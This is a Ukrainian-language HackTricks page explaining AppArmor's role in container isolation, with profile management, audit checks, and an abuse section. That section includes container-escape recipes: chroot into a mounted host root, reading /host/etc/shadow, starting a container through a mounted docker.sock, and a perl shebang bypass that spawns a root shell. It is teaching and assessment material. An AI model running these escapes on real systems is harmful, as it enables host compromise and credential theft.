# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Огляд

AppArmor — це система **Mandatory Access Control**, яка застосовує обмеження через профілі, прив'язані до кожної програми. На відміну від традиційних перевірок DAC, що значною мірою залежать від власника та групи, AppArmor дозволяє kernel застосовувати політику, прикріплену безпосередньо до процесу. У середовищах container це важливо, бо workload може мати достатньо традиційних привілеїв для спроби дії й усе одно бути відхиленим, оскільки його AppArmor профіль не дозволяє відповідний path, mount, network behavior або використання capability.

Найважливіша концептуальна ідея в тому, що AppArmor є **path-based**. Він оцінює доступ до файлової системи через правила, основані на шляхах, а не через labels, як це робить SELinux. Це робить його доступним для розуміння та потужним інструментом, але також означає, що bind mounts і альтернативні структури шляхів потребують уважної уваги. Якщо той самий вміст хоста стане доступним під іншим path, ефект політики може відрізнятися від того, чого оператор спочатку очікував.

## Роль у ізоляції контейнерів

Огляди безпеки container часто обмежуються перевірками capabilities та seccomp, але AppArmor залишається важливим і після цих перевірок. Уявіть container, який має більше привілеїв, ніж повинен, або workload, якому для роботи знадобилась додаткова capability з операційних причин. AppArmor все одно може обмежити доступ до файлів, поведінку mount, networking та патерни виконання таким чином, щоб припинити очевидний abuse path. Саме тому відключення AppArmor «щоб додаток просто запрацював» може непомітно перетворити просто ризикову конфігурацію на таку, що активно експлуатується.

## Lab

Щоб перевірити, чи AppArmor активний на хості, використайте:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Щоб побачити, під яким обліком працює поточний процес контейнера:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Різниця повчальна. У звичайному випадку процес має відображати AppArmor-контекст, прив'язаний до профілю, обраного runtime. У випадку unconfined цей додатковий шар обмежень зникає.

Ви також можете переглянути, що Docker вважає, що він застосував:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Використання під час виконання

Docker може застосувати стандартний або власний AppArmor профіль, якщо хост це підтримує. Podman також може інтегруватися з AppArmor на системах, заснованих на AppArmor, хоча на дистрибутивах, орієнтованих на SELinux, інша MAC-система часто займає центральне місце. Kubernetes може надавати політику AppArmor на рівні робочого навантаження на вузлах, які фактично підтримують AppArmor. LXC та пов'язані середовища системних контейнерів сімейства Ubuntu також широко використовують AppArmor.

Практично важливо, що AppArmor — це не "фіча Docker". Це функція хоста/ядра, яку кілька runtimes можуть застосовувати. Якщо хост не підтримує її або runtime вказано запускати unconfined, передбачений захист насправді відсутній.

Щодо Kubernetes, сучасним API є `securityContext.appArmorProfile`. З Kubernetes `v1.30` старі бета-анітації AppArmor вважаються застарілими. На підтримуваних хостах `RuntimeDefault` є профілем за замовчуванням, тоді як `Localhost` вказує на профіль, який вже має бути завантажений на вузлі. Це важливо при перевірці, тому що маніфест може виглядати сумісним з AppArmor, але при цьому повністю залежати від підтримки на боці вузла і попередньо завантажених профілів.

Одна тонка, але корисна операційна деталь: явне встановлення `appArmorProfile.type: RuntimeDefault` є жорсткішим, ніж просте пропускання цього поля. Якщо поле встановлено явно і вузол не підтримує AppArmor, admission має бути відхилений. Якщо поле опущено, робоче навантаження може все ще запуститися на вузлі без AppArmor і просто не отримає додаткового рівня ізоляції. З погляду атакуючого, це добра причина перевірити як маніфест, так і реальний стан вузла.

На хостах з підтримкою AppArmor для Docker найвідоміший профіль за замовчуванням — `docker-default`. Цей профіль генерується з AppArmor-шаблону Moby і важливий тим, що пояснює, чому деякі PoC, що залежать від capability, все ще зазнають невдачі в контейнері за замовчуванням. У загальних рисах `docker-default` дозволяє звичайну мережеву активність, забороняє записи в більшу частину `/proc`, забороняє доступ до чутливих частин `/sys`, блокує операції mount і обмежує ptrace так, щоб він не був загальним інструментом для опитування хоста. Розуміння цієї базової політики допомагає відрізнити «контейнер має `CAP_SYS_ADMIN`» від «контейнер дійсно може використати цю capability проти інтерфейсів ядра, що мене цікавлять».

## Управління профілями

Профілі AppArmor зазвичай зберігаються в `/etc/apparmor.d/`. Загальною конвенцією іменування є заміна слешів у шляху до виконуваного файлу крапками. Наприклад, профіль для `/usr/bin/man` зазвичай зберігається як `/etc/apparmor.d/usr.bin.man`. Ця деталь важлива і при захисті, і при оцінці, тому що, знаючи активну назву профілю, ви часто можете швидко знайти відповідний файл на хості.

Корисні команди для управління на боці хоста включають:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Причина, чому ці команди важливі у довіднику з container-security, полягає в тому, що вони пояснюють, як профілі фактично створюються, завантажуються, переключаються в complain mode і змінюються після змін у застосунку. Якщо оператор має звичку переводити профілі в complain mode під час усунення несправностей і забувати відновити enforcement, контейнер може виглядати захищеним у документації, але на практиці поводитися значно вільніше.

### Створення та оновлення профілів

`aa-genprof` може спостерігати за поведінкою застосунку і допомагати інтерактивно генерувати профіль:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` може згенерувати шаблон профілю, який пізніше можна буде завантажити за допомогою `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Коли бінарний файл змінюється і політику потрібно оновити, `aa-logprof` може повторно відтворити відмови, знайдені в логах, і допомогти оператору вирішити, дозволити їх чи заборонити:
```bash
sudo aa-logprof
```
### Журнали

Відмови AppArmor часто видно через `auditd`, syslog або інструменти, такі як `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Це корисно в операційній та наступальній діяльності. Захисники використовують це для уточнення профілів. Атакувальники використовують це, щоб дізнатися, який саме шлях або операція відхиляються і чи саме AppArmor є контролем, що блокує ланцюжок експлойту.

### Визначення точного файлу профілю

Коли середовище виконання показує конкретну назву профілю AppArmor для контейнера, часто корисно зіставити цю назву з файлом профілю на диску:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Це особливо корисно під час перевірки з боку хоста, оскільки воно долає розрив між «контейнер каже, що він працює під профілем `lowpriv`» і «фактичні правила зберігаються в цьому конкретному файлі, який можна перевірити або перезавантажити».

### Правила з високою інформативністю для аудиту

Коли ви можете прочитати профіль, не зупиняйтесь на простих рядках `deny`. Кілька типів правил суттєво змінюють ефективність AppArmor проти спроби виходу з контейнера:

- `ux` / `Ux`: дозволяє виконати цільовий бінарний файл без обмежень. Якщо під `ux` дозволений доступний helper, shell або інтерпретатор, це зазвичай перше, що варто перевірити.
- `px` / `Px` та `cx` / `Cx`: виконують переходи профілю під час exec. Це не автоматично погано, але варто перевірити, бо перехід може призвести в набагато ширший профіль, ніж поточний.
- `change_profile`: дозволяє задачі переключитися в інший завантажений профіль негайно або при наступному exec. Якщо цільовий профіль слабший, це може стати шляхом для виходу з обмежувального домену.
- `flags=(complain)`, `flags=(unconfined)`, or newer `flags=(prompt)`: це повинно змінити ступінь довіри до профілю. `complain` логуватиме відмови замість їхнього застосування, `unconfined` усуває межу, а `prompt` залежить від шляху прийняття рішень у userspace, а не від чистої відмови, забезпеченої ядром.
- `userns` or `userns create,`: новіші політики AppArmor можуть контролювати створення user namespaces. Якщо профіль контейнера явно дозволяє це, вкладені user namespaces залишаються доступними навіть коли платформа використовує AppArmor як частину стратегії жорсткої настройки.

Корисний grep на стороні хоста:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Такий аудит часто корисніший, ніж розгляд сотень звичайних правил для файлів. Якщо breakout залежить від виконання допоміжної програми, входу в новий namespace або втечі в менш обмежувальний profile, відповідь часто прихована в цих правилах, орієнтованих на переходи, а не в очевидних рядках на кшталт `deny /etc/shadow r`.

## Неправильні налаштування

Найочевидніша помилка — `apparmor=unconfined`. Адміністратори часто встановлюють його під час налагодження додатка, який зазнав збою, тому що profile правильно заблокував щось небезпечне або несподіване. Якщо прапорець залишиться в робочому середовищі, весь шар MAC фактично буде відключено.

Ще одна тонка проблема — припущення, що bind mounts нешкідливі, тому що дозволи файлів виглядають звичайно. Оскільки AppArmor є path-based, відкрите представлення host paths під альтернативними точками монтування може погано взаємодіяти з path rules. Третя помилка — забувати, що назва profile в config file мало що означає, якщо host kernel фактично не застосовує AppArmor.

## Зловживання

Коли AppArmor відсутній, операції, які раніше були обмежені, можуть раптово запрацювати: читання чутливих шляхів через bind mounts, доступ до частин procfs або sysfs, які мали залишатися складнішими у використанні, виконання дій, пов'язаних з mount, якщо capabilities/seccomp також дозволяють це, або використання шляхів, які profile зазвичай би заборонив. AppArmor часто є механізмом, що пояснює, чому спроба breakout на основі capabilities "should work" на папері, але все ще не вдається на практиці. Видаліть AppArmor — і та сама спроба може почати вдаватися.

Якщо ви підозрюєте, що AppArmor є основною перешкодою для path-traversal, bind-mount або mount-based ланцюжка зловживання, першим кроком зазвичай є порівняння того, що стає доступним з profile і без нього. Наприклад, якщо host path змонтовано всередині контейнера, почніть з перевірки, чи можете ви пройти по ньому та прочитати його:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Якщо контейнер також має небезпечну можливість, таку як `CAP_SYS_ADMIN`, одним із найпрактичніших тестів є перевірити, чи саме AppArmor блокує операції mount або доступ до чутливих файлових систем ядра:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
У середовищах, де шлях хоста вже доступний через bind mount, втрата AppArmor може також перетворити проблему розкриття інформації лише для читання на прямий доступ до файлів хоста:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Суть цих команд не в тому, що лише AppArmor створює вихід. Суть у тому, що як тільки AppArmor відключено, багато filesystem і mount-based abuse paths стають одразу доступними для тестування.

### Повний приклад: AppArmor відключено + корінь хоста змонтовано

Якщо контейнер уже має host root bind-mounted at `/host`, відключення AppArmor може перетворити заблокований filesystem abuse path на повний host escape:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Як тільки shell виконується через host filesystem, workload фактично вийшов за межі container boundary:
```bash
id
hostname
cat /etc/shadow | head
```
### Повний приклад: AppArmor вимкнено + Runtime Socket

Якщо справжнім бар'єром був AppArmor навколо runtime state, змонтований socket може бути достатнім для повного escape:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
### Повний приклад: Path-Based Bind-Mount Bypass

Точний шлях залежить від mount point, але кінцевий результат той самий: AppArmor більше не перешкоджає доступу до runtime API, і runtime API може запустити контейнер, що компрометує хост.

Оскільки AppArmor орієнтований на шляхи, захист `/proc/**` не забезпечує автоматичного захисту того самого вмісту procfs хоста, коли він доступний через інший шлях:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Наслідки залежать від того, що саме змонтовано і чи обходить альтернативний шлях інші засоби контролю, але цей шаблон є одним з найочевидніших причин, через які AppArmor має оцінюватися разом із схемою монтування, а не окремо.

### Повний приклад: Shebang Bypass

Політика AppArmor іноді орієнтується на шлях до інтерпретатора таким чином, що не повністю враховує виконання скриптів через обробку shebang. Історичний приклад полягав у використанні скрипта, перший рядок якого вказував на обмежений інтерпретатор:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Такий приклад важливий як нагадування про те, що наміри профілю та фактична семантика виконання можуть розходитися. При перегляді AppArmor у контейнерних середовищах особливу увагу слід приділяти ланцюжкам інтерпретаторів і альтернативним шляхам виконання.

## Checks

Метою цих перевірок є швидко відповісти на три питання: чи увімкнено AppArmor на хості, чи обмежено поточний процес, і чи дійсно середовище виконання застосувало профіль до цього контейнера?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Цікаве тут:

- Якщо `/proc/self/attr/current` показує `unconfined`, робоче навантаження не отримує вигоди від ізоляції AppArmor.
- Якщо `aa-status` показує, що AppArmor вимкнено або не завантажено, будь-яка назва профілю в runtime-конфігурації переважно косметична.
- Якщо `docker inspect` показує `unconfined` або несподіваний кастомний профіль, це часто причина, через яку працює шлях зловживання, пов'язаний із файловою системою або точками монтування.
- Якщо `/sys/kernel/security/apparmor/profiles` не містить очікуваного профілю, конфігурація runtime або оркестратора сама по собі недостатня.
- Якщо нібито загартований профіль містить `ux`, широкі правила типу `change_profile`, `userns` або `flags=(complain)`, практичний кордон може бути значно слабшим, ніж натякає назва профілю.

Якщо контейнер уже має підвищені привілеї з операційних причин, збереження AppArmor увімкненим часто визначає різницю між контрольованим винятком і набагато ширшою компрометацією безпеки.

## Runtime Defaults

| Runtime / platform | Стан за замовчуванням | Поведінка за замовчуванням | Типові ручні послаблення |
| --- | --- | --- | --- |
| Docker Engine | За замовчуванням увімкнено на хостах, що підтримують AppArmor | Використовує профіль AppArmor `docker-default`, якщо не вказано інше | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Залежить від хоста | AppArmor підтримується через `--security-opt`, але точний профіль за замовчуванням залежить від хоста/runtime і менш універсальний, ніж документований Docker профіль `docker-default` | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Умовний | Якщо `appArmorProfile.type` не вказано, значення за замовчуванням — `RuntimeDefault`, але воно застосовується лише тоді, коли AppArmor увімкнено на вузлі | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` з слабким профілем, вузли без підтримки AppArmor |
| containerd / CRI-O under Kubernetes | Залежить від підтримки вузла/runtime | Типові runtimes, що підтримуються Kubernetes, підтримують AppArmor, але фактичне застосування все одно залежить від підтримки вузла та налаштувань робочого навантаження | Те саме, що й у рядку Kubernetes; пряма конфігурація runtime також може повністю пропустити AppArmor |

Для AppArmor найбільш важливою змінною часто є саме **хост**, а не лише runtime. Налаштування профілю в маніфесті не створює ізоляції на вузлі, де AppArmor не увімкнено.
